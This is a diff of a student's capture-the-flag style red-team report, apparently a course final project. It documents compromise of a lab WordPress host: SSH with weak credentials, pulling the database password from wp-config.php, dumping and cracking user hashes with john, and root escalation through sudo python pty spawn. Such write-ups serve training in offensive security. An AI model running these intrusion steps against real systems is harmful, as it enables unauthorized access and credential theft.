@@ -11,8 +11,8 @@ Nmap scan results for each machine reveal the below services and OS details:
 
 ```bash
 $ nmap 192.168.1.0/24
-# Insert nmap Screenshot
 ```
+![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/nmap%20cider%20scan.png)
 
 This scan identifies the services below as potential points of entry:
 - Target 1
@@ -32,7 +32,7 @@ The following vulnerabilities were identified on Target 1:
   - CVE-2017-7494 Samba NetBIOS (Severity: Critical)
 
 
-_TODO: ADD Screenshot nmap -sV 
+![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/nmap%20-sV%20192.168.1.110.png)
 
 
 ### Exploitation
@@ -41,78 +41,108 @@ _TODO: Fill out the details below. Include screenshots where possible._
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
 - Target 1
   - `flag1.txt`: _TODO: Insert `flag1.txt` hash value_
-    - **Exploit Used**
-      - ssh into Michael's account and look through files in /var/www
-      - Command: ssh michael@192.168.1.110
-      - The username and password for Michael's account is identical: michael
-      - Command: cd /var/www
-      - Command: ls 
-      - Command: grep -RE flag html
-      ### ADD Screenshot of Flag 1
+   - **Exploit Used**
+    - ssh into Michael's account and look through files in /var/www
+    - Command: ssh michael@192.168.1.110
+    - The username and password for Michael's account is identical: michael
+    - Command: cd ../../var/www
+    - Command: ls 
+    - Command: grep -RE flag html
+     
+  
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/var:www%20and%20ls.png)
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/grep%20command%20flag%201.png)
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/flag%201.png)
 
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
-    - **Exploit Used**
-      - Command: ssh michael@192.168.1.110 
-      - The username and password for Michael's account is identical: michael
-      - Command: locate *flag*
-      - Command: cat /var/www/flag2.txt
-       ### ADD Screenshot of locate *flag* and flag2.txt.png
+   - **Exploit Used**
+    - Command: ssh michael@192.168.1.110 
+    - The username and password for Michael's account is identical: michael
+    - Command: locate *flag*
+    - Command: cat /var/www/flag2.txt
+  
+  
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/locate%20*flag*.png)
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/flag2.txt.png) 
 
   - `flag3.txt`: 
-    - **Exploit Used**
-      - Continued using michael shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in wp_posts table.
-      - Command: ls /var/www/html/wordpress/
-	### Add ls wordpress/Screenshot
+   - **Exploit Used**
+    - Continued using michael shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in wp_posts table.
+    - Command: ls /var/www/html/wordpress/
+  
+  
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/ls%20wordpress:.png)
+  
       - Command: cat /var/www/html/wordpress/wp-config.php
-	### ADD DB Username & Password Screenshot
+  
+  
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/DB%20Username%20%26%20Password.png)
 
     - Used the credentials to log into MySQL and dump WordPress user password hashes.
-      - DB_NAME: wordpress
-      - DB_USER: root
-      - DB_PASSWORD: R@v3nSecurity
-      - Command: mysql -u root -p
-       ## ADD mysql screenshot 
+     - DB_NAME: wordpress
+     - DB_USER: root
+     - DB_PASSWORD: R@v3nSecurity
+     - Command: mysql -u root -p
+ 
+ 
+ ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/mysql%20-u%20root%20-p%20command.png)
 
     - Search MySQL database for Flag 3 and Wordpress user password hashes:
-      - Flag 3 found in wp_posts.
-      - Password hashes found in wp_users.
-      - Command: show databases;
-      ### ADD show database Screenshot
-      - Command: use wordpress;
-      ### ADD use wordpress Screenshot
+     - Flag 3 found in wp_posts.
+     - Password hashes found in wp_users.
+     - Command: show databases;
+     - Command: use wordpress;
+  
+  
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/show%20db%20and%20Use%20wordpress.png)
+  
       - Command: show tables;
-       ### ADD show tables Screenshot
+  
+  
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/show%20tables%3B.png)
+  
       - Command: SELECT * FROM wp_posts;	
-      ### SCREENSHOT  SELECT * FROM wp_posts;
+  
+  
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/SELECT%20*%20FROM%20wp_posts%201.png)
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/SELECT%20*%20FROM%20wp_posts%202.png)
 
     - Screenshot of Wordpress user password hashes:
-      - Command: select * from wp_users;
-    ### ADD Steven hashed password Screenshot
-
-   - Screenshot of Flag 3
-     - Command: select * from wp_posts;
-   #### ADD Screenshot of select * from wp_posts;
+     - Command: SELECT * FROM wp_users;
+  
+  
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/SELECT%20*%20FROM%20wp_users.png)
 
 
   - `flag4.txt`:
-    - **Exploit Used**
-      - Used john to crack the password hash obtained from MySQL database, secured a new user shell as Steven, escalated to root.
-      - Cracking the hashed password using john.
-      - Copied password hash from MySQL into ~/root/wp_hashes.txt and cracked with john to discover Steven’s password: pink84.
-      - Command: john wp_hashes.txt
-	### ADD Screenshot Steven's Password Cracked hashed
+   - **Exploit Used**
+    - Used john to crack the password hash obtained from MySQL database, secured a new user shell as Steven, escalated to root.
+    - Cracking the hashed password using john.
+    - Copied password hash from MySQL into ~/root/wp_hashes.txt and cracked with john to discover Steven’s password: pink84.
+     - Command: john --show wp_hashes.txt
+
+
+![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/john%20command.png)
 
     - Secure a user shell as the user whose password you cracked.
-      - Command: ssh steven@192.168.1.110
-      - Password: pink84
+     - Command: ssh steven@192.168.1.110
+     - Password: pink84
     - Escalating to root:
-      - Command: sudo -l  
-    ### ADD SCREENSHOT sudo -l
+     - Command: sudo -l  
+ 
+ 
+ ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/sudo%20-l.png)
       - Command: sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
-     ### ADD Screenshot for python command
+  
+  
+  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/sudo%20python%20-c%20'import%20pty%3Bpty.spawn(%22:bin:bash%22)'.png)
 
     - Search for the root directory for Flag 4.
-      - Command: cd /root/
-      - Command: ls
-      - Command: cat flag4.txt
-    ### ADD SCREENSHOT cd root, ls, cat flag4.txt
+     - Command: cd /root/
+     - Command: ls
+     - Command: cat flag4.txt
+
+
+![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/cat%20flag4.txt%201.png)
+![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/cat%20flag4.txt%202.png)
+
